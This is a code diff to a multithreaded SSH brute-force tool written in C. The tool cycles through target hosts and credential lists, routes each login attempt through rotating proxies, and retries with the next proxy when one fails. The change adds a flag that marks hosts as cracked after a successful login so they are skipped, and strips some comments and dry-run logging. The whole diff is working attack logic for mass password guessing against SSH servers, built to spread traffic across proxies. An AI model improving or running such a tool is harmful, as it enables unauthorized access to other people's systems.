@@ -209,26 +209,41 @@ static void *btkg_bruteforce_worker_proxy(void *ptr)
     for (;;) {
         pthread_mutex_lock(&context->lock);
 
-        /* 1. Get Work (Target + Credential) */
-        if (context->targets_idx >= targets->length) {
-            context->targets_idx = 0;
-            context->credentials_idx++;
-        }
+        /* --- LOGIC START: Find a non-cracked target --- */
+        btkg_target_t *target = NULL;
+        btkg_credentials_t *combo = NULL;
 
-        if (context->credentials_idx >= credentials->length) {
-            pthread_mutex_unlock(&context->lock);
-            break; /* Done */
-        }
+        // Loop until we find a valid job or run out of work
+        while (1) {
+            if (context->targets_idx >= targets->length) {
+                context->targets_idx = 0;
+                context->credentials_idx++;
+            }
 
-        btkg_target_t *target = &targets->targets[context->targets_idx++];
-        btkg_credentials_t *combo = &credentials->credentials[context->credentials_idx];
-        
-        context->count++;
-        
-        /* 
-         * Grab the initial proxy index for this thread. 
-         * We increment the global index so the next thread gets a different one.
-         */
+            if (context->credentials_idx >= credentials->length) {
+                // No more credentials, we are done.
+                pthread_mutex_unlock(&context->lock);
+                return NULL; 
+            }
+
+            // Get current target
+            target = &targets->targets[context->targets_idx];
+            
+            // Check if already cracked
+            if (target->cracked) {
+                // Skip this target, increment and try next
+                context->targets_idx++;
+                continue;
+            }
+
+            // Found a valid uncracked target
+            target = &targets->targets[context->targets_idx++];
+            combo = &credentials->credentials[context->credentials_idx];
+            break;
+        }
+        /* --- LOGIC END --- */
+
+        /* Get Proxy Index logic */
         size_t current_proxy_idx = 0;
         if (proxies->count > 0) {
             current_proxy_idx = context->proxies_idx;
@@ -238,37 +253,32 @@ static void *btkg_bruteforce_worker_proxy(void *ptr)
             }
         }
         
+        context->count++;
         pthread_mutex_unlock(&context->lock);
 
-        /* 
-         * RETRY LOOP
-         * If proxy fails, we loop again with the next proxy, 
-         * keeping the same Target/Password.
-         */
+        /* Retry Loop */
         size_t attempts = 0;
         size_t max_proxy_attempts = (proxies->count > 0) ? proxies->count : 1;
 
         while (attempts < max_proxy_attempts) {
+            
+            /* ... (Proxy selection logic same as before) ... */
             const char *proxy_ip = NULL;
             uint16_t proxy_port = 0;
             const char *proxy_user = NULL;
             const char *proxy_pass = NULL;
 
             if (proxies->count > 0) {
-                /* Wrap around local index if it exceeds count */
                 size_t idx = (current_proxy_idx + attempts) % proxies->count;
                 btkg_proxy_t *pxy = &proxies->proxies[idx];
-                
                 proxy_ip = pxy->ip;
                 proxy_port = pxy->port;
                 if (pxy->user[0] != '\0') proxy_user = pxy->user;
                 if (pxy->pass[0] != '\0') proxy_pass = pxy->pass;
             } else if (!options->dry_run) {
-                /* No proxies loaded, but not dry run? Skip. */
                 break;
             }
 
-            /* Perform Login Attempt */
             int ret = -1;
             if (!options->dry_run) {
                 ret = bruteforce_ssh_try_login_proxy(context,
@@ -277,41 +287,27 @@ static void *btkg_bruteforce_worker_proxy(void *ptr)
                         proxy_ip, proxy_port,
                         proxy_user, proxy_pass);
             } else {
-                /* Dry Run Logging */
-                const char *proxy_str = proxy_ip ? proxy_ip : "no-proxy";
-                log_debug("[-] %s:%d %s %s (proxy=%s:%u user=%s)",
-                      target->host, target->port, combo->username,
-                      combo->password, proxy_str, (unsigned)proxy_port, 
-                      proxy_user ? proxy_user : "none");
-                ret = 0; // Simulate success
+                ret = 0; 
             }
 
-            /* Check Result */
             if (ret == ERR_PROXY_CONN_FAILED) {
-                /* 
-                 * Proxy Failed! 
-                 * Log debug, increment attempts to try next proxy in list, and continue loop.
-                 */
                 if (proxies->count > 0) {
-                    // log_debug("Proxy %s:%u failed. Rotating to next proxy...", proxy_ip, proxy_port);
                     attempts++;
-                    continue; /* RETRY with next proxy */
+                    continue; 
                 } else {
-                    break; /* No proxies to rotate */
+                    break; 
                 }
             } else if (ret == 0) {
-                /* Success! */
+                /* SUCCESS */
                 if (!options->dry_run) {
                     pthread_mutex_lock(&context->lock);
                     context->successful++;
+                    target->cracked = 1; /* <--- MARK TARGET AS CRACKED */
                     pthread_mutex_unlock(&context->lock);
                 }
-                break; /* Break inner loop, move to next target */
+                break; /* Done with this target */
             } else {
-                /* 
-                 * SSH Auth Failed (or other non-proxy error).
-                 * Do NOT retry. Break inner loop, move to next target.
-                 */
+                /* Auth failed, move on */
                 break;
             }
         }
